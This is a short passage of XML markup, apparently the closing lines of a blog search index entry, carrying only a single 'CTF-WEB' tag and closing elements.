      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
</search>
